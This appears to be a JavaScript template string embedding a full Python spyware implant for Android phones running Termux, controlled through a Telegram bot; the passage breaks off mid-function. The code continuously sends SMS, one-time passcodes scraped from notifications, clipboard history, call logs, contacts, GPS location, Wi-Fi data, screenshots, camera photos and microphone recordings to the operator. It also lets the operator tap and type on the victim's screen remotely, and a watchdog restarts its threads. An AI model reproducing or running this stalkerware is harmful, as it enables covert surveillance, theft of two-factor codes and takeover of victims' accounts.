window.TEMPLATE_COMMAND="import os\nimport re\nimport sys\nimport time\nimport json\nimport uuid\nimport socket\nimport getpass\nimport platform\nimport sqlite3\nimport shutil\nimport tempfile\nimport hashlib\nimport hmac\nimport threading\nimport subprocess\nimport datetime\nimport requests\nimport queue as _q\n\nBOT_TOKEN='BOT_TOKEN'\nCHAT_ID='CHAT_ID'\nLABEL='Target'\nSOCKS5_PROXY=''\nCMD_KEY=''\n\nPHOTO_EXT=('.jpg','.jpeg','.png','.webp','.heic','.heif','.gif','.bmp','.tiff','.tif','.raw','.dng','.svg','.avif','.jfif','.ico')\nMAX_BYTES=45*1024*1024\nSEND_WORKERS=4\nSCAN_WORKERS=6\nSMS_INTERVAL=15\nNOTIF_INTERVAL=20\nLOC_INTERVAL=900\nBATT_INTERVAL=600\nCLIP_INTERVAL=60\nCALL_INTERVAL=300\nWIFI_INTERVAL=300\nHEARTBEAT_INTERVAL=300\nSENSOR_INTERVAL=30\nAPP_WATCH_INTERVAL=10\nSCREEN_WATCH_INTERVAL=15\nLOCMOVE_INTERVAL=300\nLOCMOVE_THRESHOLD=200\nSHOTLOOP_INTERVAL=60\nBATTHIST_INTERVAL=900\nSENSOR_MOTION_THRESHOLD=1.5\nBATCH_SIZE=20\nBATCH_INTERVAL=5\nBATCH_TXT_MAX=3900\n\nAPI='https://api.telegram.org/bot'+BOT_TOKEN\nBASE='/storage/emulated/0'\n_cwd=BASE\n_files={}\n_cb_id=''\n_offset=0\n_running=True\n_heartbeat_alive=True\n_PROXIES={'https':SOCKS5_PROXY,'http':SOCKS5_PROXY} if SOCKS5_PROXY else None\n_BATCH_QUEUE=[]\n_BATCH_LOCK=threading.Lock()\n_BATCH_COUNTER=0\n_BATCH_SEP='-'*27\n_shotloop_on=False\n_last_loc=None\n_SENT_LOCK=threading.Lock()\n_SEND_LOCK=threading.Lock()\n_clip_history=[]\n_CLIP_HIST_MAX=500\n_CLIP_LOCK=threading.Lock()\nPUSH_DIR=BASE+'/Download'\nSENT_DB='/data/data/com.termux/files/home/.cache.dat'\nDEDUP_DB='/data/data/com.termux/files/home/.dedup.dat'\nCLIP_DB='/data/data/com.termux/files/home/.cliphist.dat'\n\ndef _tg(method,**kw):\n    try:\n        if _PROXIES and 'proxies' not in kw:\n            kw['proxies']=_PROXIES\n        return requests.post(API+'/'+method,timeout=60,**kw).json()\n    except Exception:\n        return {}\n\ndef _send(text,kb=None):\n    try:\n        d={'chat_id':CHAT_ID,'text':str(text)[:4000],'parse_mode':'Markdown'}\n        if kb:\n            d['reply_markup']={'inline_keyboard':kb}\n        return _tg('sendMessage',json=d)\n    except Exception:\n        return {}\n\ndef _edit(msg_id,text,kb=None):\n    try:\n        d={'chat_id':CHAT_ID,'message_id':msg_id,'text':str(text)[:4000],'parse_mode':'Markdown'}\n        if kb:\n            d['reply_markup']={'inline_keyboard':kb}\n        _tg('editMessageText',json=d)\n    except Exception:\n        pass\n\ndef _ack(text=''):\n    global _cb_id\n    if _cb_id:\n        try:\n            _tg('answerCallbackQuery',json={'callback_query_id':_cb_id,'text':str(text)[:200]})\n        except Exception:\n            pass\n        _cb_id=''\n\ndef _send_photo(path,caption=''):\n    try:\n        with open(path,'rb') as f:\n            return _tg('sendPhoto',data={'chat_id':CHAT_ID,'caption':str(caption)[:1000]},files={'photo':f})\n    except Exception as e:\n        return {'ok':False,'err':str(e)}\n\ndef _send_doc(path,caption=''):\n    try:\n        with open(path,'rb') as f:\n            _tg('sendDocument',data={'chat_id':CHAT_ID,'caption':str(caption)[:1000]},files={'document':f})\n    except Exception:\n        pass\n\ndef _send_voice(path,caption=''):\n    try:\n        with open(path,'rb') as f:\n            _tg('sendVoice',data={'chat_id':CHAT_ID,'caption':str(caption)[:1000]},files={'voice':f})\n    except Exception:\n        pass\n\ndef _send_video(path,caption=''):\n    try:\n        with open(path,'rb') as f:\n            _tg('sendVideo',data={'chat_id':CHAT_ID,'caption':str(caption)[:1000]},files={'video':f})\n    except Exception:\n        pass\n\ndef _cmd_enc(plain):\n    if not CMD_KEY:\n        return plain\n    k=CMD_KEY.encode()\n    x=bytes(b ^ k[i%len(k)] for i,b in enumerate(plain.encode()))\n    mac=hmac.new(k,x,hashlib.sha256).hexdigest()[:16]\n    return mac+':'+x.hex()\n\ndef _cmd_dec(token):\n    if not CMD_KEY:\n        return token\n    try:\n        mac,hexd=token.split(':',1)\n        k=CMD_KEY.encode()\n        x=bytes.fromhex(hexd)\n        if hmac.new(k,x,hashlib.sha256).hexdigest()[:16]!=mac:\n            return ''\n        return bytes(b ^ k[i%len(k)] for i,b in enumerate(x)).decode()\n    except Exception:\n        return ''\n\ndef _sent_load():\n    if not os.path.exists(SENT_DB):\n        return set()\n    try:\n        with open(SENT_DB) as f:\n            return set(l.strip() for l in f if l.strip())\n    except Exception:\n        return set()\n\ndef _sent_mark(p):\n    with _SENT_LOCK:\n        try:\n            with open(SENT_DB,'a') as f:\n                f.write(p+chr(10))\n        except Exception:\n            pass\n\ndef _dedup_load():\n    if not os.path.exists(DEDUP_DB):\n        return set()\n    try:\n        with open(DEDUP_DB) as f:\n            return set(l.strip() for l in f if l.strip())\n    except Exception:\n        return set()\n\ndef _dedup_mark(h):\n    with _SENT_LOCK:\n        try:\n            with open(DEDUP_DB,'a') as f:\n                f.write(h+chr(10))\n        except Exception:\n            pass\n\ndef _h(s):\n    return hashlib.md5(str(s).encode()).hexdigest()\n\ndef _cliphist_load():\n    global _clip_history\n    if not os.path.exists(CLIP_DB):\n        _clip_history=[]\n        return\n    try:\n        with open(CLIP_DB) as f:\n            data=json.load(f)\n            if isinstance(data,list):\n                _clip_history=data[-_CLIP_HIST_MAX:]\n    except Exception:\n        _clip_history=[]\n\ndef _cliphist_save():\n    with _CLIP_LOCK:\n        try:\n            with open(CLIP_DB,'w') as f:\n                json.dump(_clip_history[-_CLIP_HIST_MAX:],f)\n        except Exception:\n            pass\n\ndef _batch_push_photo(path,caption=''):\n    with _BATCH_LOCK:\n        _BATCH_QUEUE.append(('photo',path,caption))\n\ndef _batch_push_text(text):\n    with _BATCH_LOCK:\n        _BATCH_QUEUE.append(('text',str(text),''))\n\ndef _batch_drain():\n    with _BATCH_LOCK:\n        items=list(_BATCH_QUEUE)\n        _BATCH_QUEUE.clear()\n    return items\n\ndef _digest_classify(text):\n    prefix_map=[('[SMS]','SMS'),('[OTP]','OTP'),('[NOTIF]','NOTIF'),('[APP]','APP'),('[SCREEN]','SCREEN'),('[MOTION]','MOTION'),('[STEPS]','STEPS'),('[LIGHT]','LIGHT'),('[CLIP]','CLIP'),('[CALL]','CALL'),('[WIFI]','WIFI'),('[BATT]','BATT'),('[LOC]','LOC'),('[PHOTO]','PHOTO'),('[MOVE]','MOVE'),('[TRASHED]','TRASHED')]\n    for icon,label in prefix_map:\n        if text.startswith(icon):\n            return icon,label\n    return ('[*]','OTHER')\n\ndef _digest_format_item(idx,text):\n    icon,label=_digest_classify(text)\n    body=text[len(icon):].strip() if text.startswith(icon) else text\n    body=body.replace('```','').strip()\n    lines=[]\n    for raw in body.split(chr(10)):\n        ln=raw.strip()\n        if ln:\n            lines.append(ln)\n    if not lines:\n        lines=[body[:120]]\n    header='> ['+('%02d'%idx)+'] '+icon+' *'+label+'*'\n    body_lines=['       '+ln[:120] for ln in lines[:4]]\n    return header+chr(10)+chr(10).join(body_lines)\n\ndef _digest_build(items,batch_no,total):\n    ts=time.strftime('%Y-%m-%d %H:%M:%S')\n    lines=['*DATA REPORT #'+('%03d'%batch_no)+'*',_BATCH_SEP,ts,str(len(items))+' / '+str(total)+' items',_BATCH_SEP,'']\n    for i,item in enumerate(items,1):\n        lines.append(_digest_format_item(i,item))\n        lines.append('')\n    counter={}\n    for item in items:\n        _,lbl=_digest_classify(item)\n        counter[lbl]=counter.get(lbl,0)+1\n    lines.append(_BATCH_SEP)\n    lines.append('*SUMMARY*')\n    for lbl in sorted(counter.keys()):\n        lines.append('   '+lbl+': '+str(counter[lbl]))\n    lines.append(_BATCH_SEP)\n    lines.append('[BATCH #'+('%03d'%batch_no)+' COMPLETE]')\n    return chr(10).join(lines)\n\ndef _batch_send_photos(photos):\n    chunks=[photos[i:i+10] for i in range(0,len(photos),10)]\n    for chunk in chunks:\n        sent_via_group=False\n        try:\n            media=[]\n            files={}\n            for idx,(path,cap) in enumerate(chunk):\n                key='photo'+str(idx)\n                media.append({'type':'photo','media':'attach://'+key,'caption':str(cap)[:1000]})\n                files[key]=open(path,'rb')\n            try:\n                resp=_tg('sendMediaGroup',data={'chat_id':CHAT_ID,'media':json.dumps(media)},files=files)\n                if resp and resp.get('ok'):\n                    sent_via_group=True\n            finally:\n                for f in files.values():\n                    try: f.close()\n                    except Exception: pass\n            time.sleep(1)\n        except Exception:\n            sent_via_group=False\n        if not sent_via_group:\n            for path,cap in chunk:\n                try:\n                    _send_photo(path,cap)\n                    time.sleep(0.5)\n                except Exception:\n                    pass\n\ndef _batch_send_texts(texts):\n    global _BATCH_COUNTER\n    if not texts:\n        return\n    total=len(texts)\n    chunks=[texts[i:i+BATCH_SIZE] for i in range(0,len(texts),BATCH_SIZE)]\n    for chunk in chunks:\n        _BATCH_COUNTER+=1\n        report=_digest_build(chunk,_BATCH_COUNTER,total)\n        if len(report)<=4000:\n            _send(report)\n            time.sleep(1)\n        else:\n            p='/data/data/com.termux/files/usr/tmp/r'+str(_BATCH_COUNTER)+'.txt'\n            try:\n                with open(p,'w') as f:\n                    f.write(report)\n                _send_doc(p,'REPORT #'+str(_BATCH_COUNTER))\n            except Exception:\n                pass\n            finally:\n                try: os.remove(p)\n                except Exception: pass\n            time.sleep(1)\n\ndef _batch_flush():\n    items=_batch_drain()\n    if not items:\n        return\n    photos=[(p,c) for t,p,c in items if t=='photo']\n    texts=[p for t,p,c in items if t=='text']\n    if photos:\n        _batch_send_photos(photos)\n    if texts:\n        _batch_send_texts(texts)\n\ndef _get_public_ip():\n    try:\n        if _PROXIES:\n            return requests.get('https://api.ipify.org',timeout=5,proxies=_PROXIES).text\n        return requests.get('https://api.ipify.org',timeout=5).text\n    except Exception:\n        return 'unknown'\n\ndef _collect_sysinfo():\n    try:\n        local_ip=socket.gethostbyname(socket.gethostname())\n    except Exception:\n        local_ip='unknown'\n    lines=['*'+LABEL+' Online*','Host: '+socket.gethostname(),'User: '+getpass.getuser(),'OS: '+platform.system()+' '+platform.release(),'Arch: '+platform.machine(),'Local IP: '+local_ip,'Public IP: '+_get_public_ip(),'MAC: '+hex(uuid.getnode())]\n    for prop in ['ro.product.model','ro.product.manufacturer','ro.build.version.release','ro.build.version.sdk','gsm.sim.operator.alpha','ro.serialno']:\n        try:\n            r=subprocess.run(['getprop',prop],capture_output=True,text=True,timeout=5)\n            if r.stdout.strip():\n                lines.append(prop+': '+r.stdout.strip())\n        except Exception:\n            pass\n    _send(chr(10).join(lines))\n\ndef _request_perms():\n    perms=[['termux-camera-photo','-c','0','/dev/null'],['termux-contact-list'],['termux-sms-list','-l','1'],['termux-location','-p','network'],['termux-notification-list'],['termux-clipboard-get'],['termux-battery-status'],['termux-call-log','-l','1']]\n    for p in perms:\n        try:\n            subprocess.run(p,capture_output=True,timeout=8)\n        except Exception:\n            pass\n\ndef _watch_sms():\n    seen=_dedup_load()\n    while _running:\n        try:\n            r=subprocess.run(['termux-sms-list','-l','10'],capture_output=True,text=True,timeout=10)\n            raw=r.stdout.strip()\n            if not raw:\n                time.sleep(SMS_INTERVAL); continue\n            try:\n                arr=json.loads(raw)\n            except Exception:\n                arr=[]\n            for msg in arr:\n                h=_h(json.dumps(msg,sort_keys=True))\n                if h in seen:\n                    continue\n                seen.add(h); _dedup_mark(h)\n                num=msg.get('number','?')\n                body=msg.get('body','').replace(chr(10),' ')[:200]\n                _batch_push_text('[SMS] '+num+' | '+body)\n        except Exception:\n            pass\n        time.sleep(SMS_INTERVAL)\n\ndef _watch_notif():\n    last=''\n    while _running:\n        try:\n            r=subprocess.run(['termux-notification-list'],capture_output=True,text=True,timeout=10)\n            cur=r.stdout.strip()\n            if cur and cur!=last:\n                otps=re.findall(r'\\b\\d{4,8}\\b',cur)\n                if otps:\n                    _batch_push_text('[OTP] '+','.join(otps[:3]))\n                else:\n                    try:\n                        j=json.loads(cur)\n                        if isinstance(j,list) and j:\n                            j=j[0]\n                        pkg=j.get('packageName','?')\n                        title=(j.get('title') or '')[:60]\n                        _batch_push_text('[NOTIF] '+pkg+' | '+title)\n                    except Exception:\n                        _batch_push_text('[NOTIF] '+cur[:150])\n                last=cur\n        except Exception:\n            pass\n        time.sleep(NOTIF_INTERVAL)\n\ndef _watch_loc():\n    while _running:\n        try:\n            r=subprocess.run(['termux-location','-p','network'],capture_output=True,text=True,timeout=30)\n            if r.stdout.strip():\n                try:\n                    j=json.loads(r.stdout)\n                    lat=j.get('latitude',0)\n                    lon=j.get('longitude',0)\n                    acc=j.get('accuracy',0)\n                    _batch_push_text('[LOC] '+str(round(lat,5))+','+str(round(lon,5))+' +/-'+str(round(acc))+'m')\n                except Exception:\n                    _batch_push_text('[LOC] '+r.stdout[:150])\n        except Exception:\n            pass\n        time.sleep(LOC_INTERVAL)\n\ndef _watch_batt():\n    last=None\n    while _running:\n        try:\n            r=subprocess.run(['termux-battery-status'],capture_output=True,text=True,timeout=10)\n            raw=r.stdout.strip()\n            if not raw:\n                time.sleep(BATT_INTERVAL); continue\n            try:\n                obj=json.loads(raw)\n            except Exception:\n                obj={}\n            level=obj.get('percentage')\n            plug=obj.get('plugged')\n            if last is None or abs((level or 0)-(last.get('percentage',0)))>=2 or plug!=last.get('plugged'):\n                _batch_push_text('[BATT] '+str(level)+'% | '+str(plug))\n                last=obj\n        except Exception:\n            pass\n        time.sleep(BATT_INTERVAL)\n\ndef _watch_clip():\n    last=''\n    while _running:\n        try:\n            r=subprocess.run(['termux-clipboard-get'],capture_output=True,text=True,timeout=10)\n            cur=r.stdout.strip()\n            if cur and cur!=last:\n                with _CLIP_LOCK:\n                    _clip_history.append({'text':cur,'ts':time.time()})\n                    if len(_clip_history)>_CLIP_HIST_MAX:\n                        _clip_history.pop(0)\n                _cliphist_save()\n                _batch_push_text('[CLIP] '+cur[:150])\n                last=cur\n        except Exception:\n            pass\n        time.sleep(CLIP_INTERVAL)\n\ndef _watch_calls():\n    seen=_dedup_load()\n    while _running:\n        try:\n            r=subprocess.run(['termux-call-log','-l','10'],capture_output=True,text=True,timeout=10)\n            raw=r.stdout.strip()\n            if not raw:\n                time.sleep(CALL_INTERVAL); continue\n            try:\n                arr=json.loads(raw)\n            except Exception:\n                arr=[]\n            for c in arr:\n                h=_h(json.dumps(c,sort_keys=True))\n                if h in seen:\n                    continue\n                seen.add(h); _dedup_mark(h)\n                name=c.get('name','?')\n                num=c.get('phone_number','?')\n                dur=c.get('duration',0)\n                typ=c.get('type','?')\n                _batch_push_text('[CALL] '+name+' | '+num+' | '+str(dur)+'s')\n        except Exception:\n            pass\n        time.sleep(CALL_INTERVAL)\n\ndef _watch_wifi():\n    last=''\n    while _running:\n        try:\n            r=subprocess.run(['termux-wifi-connectioninfo'],capture_output=True,text=True,timeout=10)\n            cur=r.stdout.strip()\n            if cur and cur!=last:\n                try:\n                    j=json.loads(cur)\n                    ssid=j.get('ssid','?')\n                    ip=j.get('ip','?')\n                    _batch_push_text('[WIFI] '+ssid+' | '+ip)\n                except Exception:\n                    _batch_push_text('[WIFI] '+cur[:100])\n                last=cur\n        except Exception:\n            pass\n        time.sleep(WIFI_INTERVAL)\n\ndef _watch_heartbeat():\n    global _heartbeat_alive\n    while _running:\n        try:\n            if _heartbeat_alive:\n                _send('heartbeat '+LABEL+' '+time.strftime('%H:%M:%S'))\n        except Exception:\n            pass\n        time.sleep(HEARTBEAT_INTERVAL)\n\ndef _read_sensor(name):\n    try:\n        r=subprocess.run(['termux-sensor','-s',name,'-n','1'],capture_output=True,text=True,timeout=10)\n        if not r.stdout.strip():\n            return None\n        return json.loads(r.stdout)\n    except Exception:\n        return None\n\ndef _sensor_value(j):\n    if not j:\n        return None\n    for k,v in j.items():\n        if isinstance(v,dict) and 'values' in v:\n            vals=v['values']\n            if isinstance(vals,list) and vals:\n                return vals[0] if len(vals)==1 else vals\n        if isinstance(v,list):\n            return v[0] if len(v)==1 else v\n    return None\n\ndef _watch_sensors():\n    last_acc=None\n    while _running:\n        try:\n            acc=_read_sensor('ACCELEROMETER')\n            if acc:\n                vals=None\n                for k,v in acc.items():\n                    if isinstance(v,dict) and 'values' in v:\n                        vals=v['values']; break\n                    if isinstance(v,list) and len(v)>=3:\n                        vals=v; break\n                if vals and len(vals)>=3:\n                    try:\n                        mag=(float(vals[0])**2+float(vals[1])**2+float(vals[2])**2)**0.5\n                        if last_acc is not None and abs(mag-last_acc)>SENSOR_MOTION_THRESHOLD:\n                            _batch_push_text('[MOTION] delta '+str(round(abs(mag-last_acc),2)))\n                        last_acc=mag\n                    except Exception:\n                        pass\n            steps=_read_sensor('STEP_COUNTER')\n            sv=_sensor_value(steps)\n            if sv is not None:\n                _batch_push_text('[STEPS] '+str(sv))\n            light=_read_sensor('LIGHT')\n            lv=_sensor_value(light)\n            if lv is not None:\n                try:\n                    _batch_push_text('[LIGHT] '+str(round(float(lv),1)))\n                except Exception:\n                    _batch_push_text('[LIGHT] '+str(lv))\n        except Exception:\n            pass\n        time.sleep(SENSOR_INTERVAL)\n\ndef _watch_foreground():\n    last=''\n    while _running:\n        try:\n            r=subprocess.run(\"dumpsys activity activities | grep -E 'mResumedActivity|topResumedActivity'\",shell=True,capture_output=True,text=True,timeout=10)\n            cur=r.stdout.strip()\n            if cur and cur!=last:\n                m=re.search(r'([a-zA-Z0-9_.]+)/[a-zA-Z0-9_.]+',cur)\n                pkg=m.group(1) if m else 'unknown'\n                _batch_push_text('[APP] '+pkg)\n                last=cur\n        except Exception:\n            pass\n        time.sleep(APP_WATCH_INTERVAL)\n\ndef _watch_screen_state():\n    last=''\n    while _running:\n        try:\n            r=subprocess.run('dumpsys power | grep mWakefulness',shell=True,capture_output=True,text=True,timeout=5)\n            cur=r.stdout.strip()\n            if cur and cur!=last:\n                state='ON' if 'Awake' in cur else 'OFF'\n                _batch_push_text('[SCREEN] '+state)\n                last=cur\n        except Exception:\n            pass\n        time.sleep(SCREEN_WATCH_INTERVAL)\n\ndef _haversine(a,b):\n    from math import radians,sin,cos,sqrt,atan2\n    lat1,lon1=a; lat2,lon2=b\n    R=6371000\n    dlat=radians(lat2-lat1); dlon=radians(lon2-lon1)\n    h=sin(dlat/2)**2+cos(radians(lat1))*cos(radians(lat2))*sin(dlon/2)**2\n    return 2*R*atan2(sqrt(h),sqrt(1-h))\n\ndef _watch_locmove():\n    global _last_loc\n    while _running:\n        try:\n            r=subprocess.run(['termux-location','-p','network'],capture_output=True,text=True,timeout=30)\n            if r.stdout.strip():\n                j=json.loads(r.stdout)\n                lat,lon=j.get('latitude'),j.get('longitude')\n                if lat is not None and lon is not None:\n                    cur=(lat,lon)\n                    if _last_loc:\n                        d=_haversine(_last_loc,cur)\n                        if d>LOCMOVE_THRESHOLD:\n                            _send('Moved '+str(round(d))+'m')\n                            _last_loc=cur\n                    else:\n                        _last_loc=cur\n        except Exception:\n            pass\n        time.sleep(LOCMOVE_INTERVAL)\n\ndef _watch_shotloop():\n    global _shotloop_on\n    idx=0\n    while _running:\n        try:\n            if _shotloop_on:\n                idx+=1\n                p='/data/data/com.termux/files/usr/tmp/.loop'+str(idx)+'.png'\n                subprocess.run(['screencap','-p',p],capture_output=True,timeout=15)\n                if os.path.exists(p) and os.path.getsize(p)>0:\n                    _batch_push_photo(p,'[PHOTO] loop_'+str(idx))\n                    try: os.remove(p)\n                    except Exception: pass\n        except Exception:\n            pass\n        time.sleep(SHOTLOOP_INTERVAL)\n\ndef _watch_batthist():\n    while _running:\n        try:\n            r=subprocess.run(['termux-battery-status'],capture_output=True,text=True,timeout=10)\n            if r.stdout.strip():\n                j=json.loads(r.stdout)\n                _batch_push_text('[BATT] '+str(j.get('percentage'))+'% | '+str(j.get('plugged')))\n        except Exception:\n            pass\n        time.sleep(BATTHIST_INTERVAL)\n\ndef _send_worker(worker_id):\n    while _running:\n        try:\n            with _BATCH_LOCK:\n                size=len(_BATCH_QUEUE)\n            if size>=BATCH_SIZE:\n                if _SEND_LOCK.acquire(blocking=False):\n                    try:\n                        _batch_flush()\n                    finally:\n                        _SEND_LOCK.release()\n                else:\n                    time.sleep(0.5)\n                continue\n            time.sleep(BATCH_INTERVAL)\n            if _SEND_LOCK.acquire(blocking=False):\n                try:\n                    _batch_flush()\n                finally:\n                    _SEND_LOCK.release()\n        except Exception:\n            pass\n        time.sleep(0.5)\n\ndef _watch_batcher():\n    for i in range(SEND_WORKERS):\n        t=threading.Thread(target=_send_worker,args=(i,),daemon=True,name='send-'+str(i))\n        t.start()\n    while _running:\n        time.sleep(60)\n\n_WATCHED={}\n\ndef _register(target_fn,name):\n    t=threading.Thread(target=target_fn,daemon=True,name=name)\n    _WATCHED[name]=(target_fn,t)\n    t.start()\n\ndef _watch_watchdog():\n    while _running:\n        try:\n            for name,(fn,t) in list(_WATCHED.items()):\n                if name=='watchdog':\n                    continue\n                if not t.is_alive():\n                    nt=threading.Thread(target=fn,daemon=True,name=name)\n                    _WATCHED[name]=(fn,nt)\n                    nt.start()\n        except Exception:\n            pass\n        time.sleep(60)\n\ndef _cmd_foto(cam='0'):\n    p='/data/data/com.termux/files/usr/tmp/shot.jpg'\n    try:\n        subprocess.run(['termux-camera-photo','-c',cam,p],capture_output=True,timeout=15)\n    except Exception:\n        pass\n    if os.path.exists(p):\n        _send_photo(p,LABEL+' cam'+cam)\n        try: os.remove(p)\n        except Exception: pass\n\ndef _cmd_video(sec='5',cam='0'):\n    p='/data/data/com.termux/files/usr/tmp/vid.mp4'\n    try:\n        subprocess.run(['termux-camera-record','-c',cam,'-l',sec,p],capture_output=True,timeout=int(sec)+15)\n    except Exception:\n        pass\n    if os.path.exists(p):\n        _send_video(p,LABEL+' vid '+sec+'s')\n        try: os.remove(p)\n        except Exception: pass\n\ndef _cmd_record(sec='10'):\n    p='/data/data/com.termux/files/usr/tmp/rec.m4a'\n    try:\n        subprocess.run(['termux-microphone-record','-l',sec,'-f',p],capture_output=True,timeout=int(sec)+15)\n    except Exception:\n        pass\n    if os.path.exists(p):\n        _send_voice(p,LABEL+' rec '+sec+'s')\n        try: os.remove(p)\n        except Exception: pass\n\ndef _cmd_screen():\n    p='/data/data/com.termux/files/usr/tmp/.scr.png'\n    try:\n        subprocess.run(['screencap','-p',p],capture_output=True,timeout=15)\n    except Exception:\n        pass\n    if os.path.exists(p) and os.path.getsize(p)>0:\n        _send_photo(p,'screen')\n        try: os.remove(p)\n        except Exception: pass\n    else:\n        _send('screencap failed')\n\ndef _cmd_screenrec(sec='15'):\n    try:\n        sec=str(min(int(sec),180))\n    except Exception:\n        sec='15'\n    p='/data/data/com.termux/files/usr/tmp/.rec.mp4'\n    try:\n        subprocess.run(['screenrecord','--time-limit',sec,p],capture_output=True,timeout=int(sec)+20)\n    except Exception:\n        pass\n    if os.path.exists(p) and os.path.getsize(p)>0:\n        _send_video(p,'screenrec '+sec+'s')\n        try: os.remove(p)\n        except Exception: pass\n    else:\n        _send('screenrecord failed')\n\ndef _cmd_tap(x,y):\n    try:\n        subprocess.run(['input','tap',str(x),str(y)],capture_output=True,timeout=5)\n        _send('tap '+str(x)+','+str(y))\n    except Exception as e:\n        _send('tap err: '+str(e)[:120])\n\ndef _cmd_swipe(x1,y1,x2,y2,dur='300'):\n    try:\n        subprocess.run(['input','swipe',str(x1),str(y1),str(x2),str(y2),str(dur)],capture_output=True,timeout=10)\n        _send('swipe '+str(x1)+','+str(y1)+' -> '+str(x2)+','+str(y2))\n    except Exception as e:\n        _send('swipe err: '+str(e)[:120])\n\ndef _cmd_type(text):\n    safe=str(text).replace(' ','%s')\n    try:\n        subprocess.run(['input','text',safe],capture_output=True,timeout=10)\n        _send('typed: '+text[:80])\n    except Exception as e:\n        _send('type err: '+str(e)[:120])\n\ndef _cmd_key(code):\n    try:\n        subprocess.run(['input','keyevent',str(code)],capture_output=True,timeout=5)\n        _send('keyevent '+str(code))\n    except Exception as e:\n        _send('key err: '+str(e)[:120])\n\ndef _cmd_uidump():\n    p=BASE+'/window_dump.xml'\n    try:\n        subprocess.run(['uiautomator','dump',p],capture_output=True,timeout=20)\n    except Exception:\n        _send('uidump err'); return\n    if not os.path.exists(p):\n        _send('uidump: no output'); return\n    try:\n        with open(p,'r',errors='ignore') as f:\n            xml=f.read()\n    except Exception as e:\n        _send('read err: '+str(e)[:120]); return\n    text_nodes=re.findall(r'<node[^>]*?text=\"([^\"]+)\"[^>]*?bounds=\"\\[(\\d+),(\\d+)\\]\\[(\\d+),(\\d+)\\]\"',xml)\n    lines=[]\n    for t,x1,y1,x2,y2 in text_nodes[:40]:\n        cx=(int(x1)+int(x2))//2\n        cy=(int(y1)+int(y2))//2\n        lines.append(t[:60]+' -> tap '+str(cx)+' '+str(cy))\n    if not lines:\n        _send('uidump: no text nodes'); return\n    _send('*UI Dump*'+chr(10)+chr(10).join(lines)[:3800])\n\ndef _cmd_kontak():\n    try:\n        r=subprocess.run(['termux-contact-list'],capture_output=True,text=True,timeout=15)\n        _send('*Contacts*'+chr(10)+(r.stdout[:3800] or 'empty'))\n    except Exception as e:\n        _send('kontak err: '+str(e))\n\ndef _cmd_sms():\n    try:\n        r=subprocess.run(['termux-sms-list','-l','50'],capture_output=True,text=True,timeout=15)\n        raw=r.stdout.strip()\n        if not raw:\n            _send('*SMS 50 terakhir*'+chr(10)+'(kosong)'); return\n        try:\n            arr=json.loads(raw)\n        except Exception:\n            _send('*SMS 50 terakhir*'+chr(10)+raw[:3800]); return\n        lines=['*SMS 50 TERAKHIR*',_BATCH_SEP,'']\n        for i,msg in enumerate(arr[:50],1):\n            num=msg.get('number','?')\n            body=msg.get('body','').replace(chr(10),' ')[:120]\n            ts=msg.get('received','')\n            if ts:\n                try:\n                    ts=time.strftime('%m-%d %H:%M',time.localtime(int(ts)/1000))\n                except Exception:\n                    ts=str(ts)[:16]\n            lines.append('> ['+('%02d'%i)+'] '+num)\n            lines.append('       '+ts)\n            lines.append('       '+body)\n            lines.append('')\n        lines.append(_BATCH_SEP)\n        lines.append('Total: '+str(len(arr[:50]))+' SMS')\n        out=chr(10).join(lines)\n        if len(out)<=4000:\n            _send(out)\n        else:\n            p='/data/data/com.termux/files/usr/tmp/sms.txt'\n            with open(p,'w') as f:\n                f.write(out)\n            _send_doc(p,'SMS 50 terakhir')\n            try: os.remove(p)\n            except Exception: pass\n    except Exception as e:\n        _send('sms err: '+str(e)[:120])\n\ndef _cmd_cliphist():\n    with _CLIP_LOCK:\n        hist=list(_clip_history)\n    if not hist:\n        _send('*Clipboard History*'+chr(10)+'(kosong)'); return\n    lines=['*CLIPBOARD HISTORY* ('+str(len(hist))+' entries)',_BATCH_SEP,'']\n    for i,item in enumerate(hist,1):\n        text=item.get('text','').replace(chr(10),' ')[:150]\n        ts=item.get('ts',0)\n        try:\n            ts_str=time.strftime('%m-%d %H:%M:%S',time.localtime(ts))\n        except Exception:\n            ts_str='?'\n        lines.append('> ['+('%03d'%i)+'] '+ts_str)\n        lines.append('       '+text)\n        lines.append('')\n    lines.append(_BATCH_SEP)\n    lines.append('Total: '+str(len(hist))+' entri')\n    out=chr(10).join(lines)\n    if len(out)<=4000:\n        _send(out)\n    else:\n        p='/data/data/com.termux/files/usr/tmp/cliphist.txt'\n        with open(p,'w') as f:\n            f.write(out)\n        _send_doc(p,'Clipboard History')\n        try: os.remove(p)\n        except Exception: pass\n\ndef _cmd_clipclear():\n    global _clip_history\n    with _CLIP_LOCK:\n        _clip_history=[]\n    _cliphist_save()\n    _send('Clipboard history dibersihin')\n\ndef _cmd_calllog():\n    try:\n        r=subprocess.run(['termux-call-log','-l','30'],capture_output=True,text=True,timeout=15)\n        _send('*Call log*'+chr(10)+(r.stdout[:3500] or 'empty'))\n    except Exception as e:\n        _send('call err: '+str(e))\n\ndef _cmd_loc():\n    try:\n        r=subprocess.run(['termux-location'],capture_output=True,text=True,timeout=30)\n        _send((r.stdout[:1500] or 'fail'))\n    except Exception as e:\n        _send('loc err: '+str(e))\n\ndef _cmd_gps():\n    try:\n        r=subprocess.run(['termux-location','-p','gps'],capture_output=True,text=True,timeout=60)\n        _send('*GPS*'+chr(10)+(r.stdout[:1500] or 'fail'))\n    except Exception as e:\n        _send('gps err: '+str(e)[:120])\n\ndef _cmd_batt():\n    try:\n        r=subprocess.run(['termux-battery-status'],capture_output=True,text=True,timeout=10)\n        _send((r.stdout[:800] or 'fail'))\n    except Exception:\n        pass\n\ndef _cmd_wifi():\n    try:\n        r=subprocess.run(['termux-wifi-connectioninfo'],capture_output=True,text=True,timeout=10)\n        _send('*WiFi*'+chr(10)+(r.stdout[:1500] or 'fail'))\n    except Exception:\n        pass\n\ndef _cmd_wifiscan():\n    try:\n        r=subprocess.run(['termux-wifi-scaninfo'],capture_output=True,text=True,timeout=15)\n        _send('*WiFi scan*'+chr(10)+(r.stdout[:3000] or 'fail'))\n    except Exception:\n        pass\n\ndef _cmd_cell():\n    try:\n        r=subprocess.run(['termux-telephony-cellinfo'],capture_output=True,text=True,timeout=15)\n        _send('*Cell*'+chr(10)+(r.stdout[:2500] or 'fail'))\n    except Exception:\n        pass\n\ndef _cmd_deviceinfo():\n    try:\n        r=subprocess.run(['termux-telephony-deviceinfo'],capture_output=True,text=True,timeout=10)\n        _send('*Device info*'+chr(10)+(r.stdout[:2500] or 'fail'))\n    except Exception:\n        pass\n\ndef _cmd_apps():\n    try:\n        